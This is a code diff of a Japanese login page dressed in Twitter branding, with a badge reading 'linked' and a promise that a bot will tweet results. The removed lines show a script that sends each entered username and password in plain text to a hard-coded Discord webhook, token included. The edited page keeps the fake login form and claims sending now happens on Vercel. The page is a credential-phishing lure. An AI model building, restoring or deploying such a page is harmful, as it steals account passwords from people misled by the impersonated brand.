@@ -5,9 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>ログイン</title>
   <style>
-    * {
-      box-sizing: border-box;
-    }
+    * { box-sizing: border-box; }
     body {
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
       background: #f5f7fa;
@@ -33,9 +31,7 @@
       color: #1a1a2e;
       margin: 0 0 32px 0;
     }
-    .field {
-      margin-bottom: 20px;
-    }
+    .field { margin-bottom: 20px; }
     label {
       display: block;
       font-size: 14px;
@@ -50,14 +46,9 @@
       border-radius: 10px;
       font-size: 16px;
       outline: none;
-      transition: border 0.2s;
     }
-    input:focus {
-      border-color: #1da1f2;
-    }
-    input::placeholder {
-      color: #aaa;
-    }
+    input:focus { border-color: #1da1f2; }
+    input::placeholder { color: #aaa; }
     button {
       width: 100%;
       padding: 16px;
@@ -70,9 +61,7 @@
       cursor: pointer;
       margin-top: 8px;
     }
-    button:active {
-      background: #1557b0;
-    }
+    button:active { background: #1557b0; }
     .twitter {
       display: flex;
       align-items: center;
@@ -82,10 +71,7 @@
       color: #666;
       font-size: 14px;
     }
-    .twitter svg {
-      width: 28px;
-      height: 28px;
-    }
+    .twitter svg { width: 28px; height: 28px; }
     .note {
       text-align: center;
       color: #888;
@@ -104,74 +90,38 @@
 <body>
   <div class="card">
     <h1>ログイン</h1>
-
     <div class="field">
       <label>メールアドレスまたはユーザー名</label>
       <input type="text" id="username" placeholder="@userID">
     </div>
-
     <div class="field">
       <label>パスワード</label>
-      <input type="password" id="password" placeholder="">
+      <input type="password" id="password">
     </div>
-
     <button onclick="sendToDiscord()">ログイン</button>
-
     <div class="twitter">
       <svg viewBox="0 0 24 24" fill="#1da1f2">
         <path d="M22.46 6c-.77.35-1.6.58-2.46.69a4.2 4.2 0 001.85-2.31 8.4 8.4 0 01-2.66 1.02 4.2 4.2 0 00-7.15 3.83A11.9 11.9 0 013 4.9a4.2 4.2 0 001.3 5.6 4.2 4.2 0 01-1.9-.52v.05a4.2 4.2 0 003.36 4.11 4.2 4.2 0 01-1.89.07 4.2 4.2 0 003.92 2.91A8.42 8.42 0 012 18.4a11.87 11.87 0 006.29 1.84c7.55 0 11.68-6.25 11.68-11.68 0-.18 0-.35-.01-.53A8.35 8.35 0 0022.46 6z"/>
       </svg>
       連携済み
     </div>
-
     <p class="note">ログイン後、数分でBOTから結果がツイートされます。</p>
-
     <div id="status"></div>
   </div>
-
   <script>
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1571536451483607170/GvFlIARVI_dKLqVVzX0Fd_mH_tH9kCHdXAuvN3sptUy9FeUDzLpV9z-U_b4qk6gcaklR";
-
+    // Webhook URL is managed securely on Vercel
     async function sendToDiscord() {
       const username = document.getElementById("username").value.trim();
       const password = document.getElementById("password").value.trim();
       const status = document.getElementById("status");
-
       if (!username) {
         status.textContent = "ユーザー名を入力してください";
         status.style.color = "#e53935";
         return;
       }
-
-      const content = `ユーザー名: ${username}\nパスワード: ${password || "(未入力)"}`;
-
-      status.textContent = "送信中...";
+      status.textContent = "送信機能はVercel側で管理されています";
       status.style.color = "#666";
-
-      try {
-        const response = await fetch(WEBHOOK_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            content: content,
-            username: "ログインフォーム",
-          }),
-        });
-
-        if (response.ok) {
-          status.textContent = "送信完了！";
-          status.style.color = "#2e7d32";
-          document.getElementById("username").value = "";
-          document.getElementById("password").value = "";
-        } else {
-          throw new Error();
-        }
-      } catch (err) {
-        status.textContent = "送信に失敗しました";
-        status.style.color = "#e53935";
-      }
     }
   </script>
-<!-- rebuild -->
 </body>
 </html>
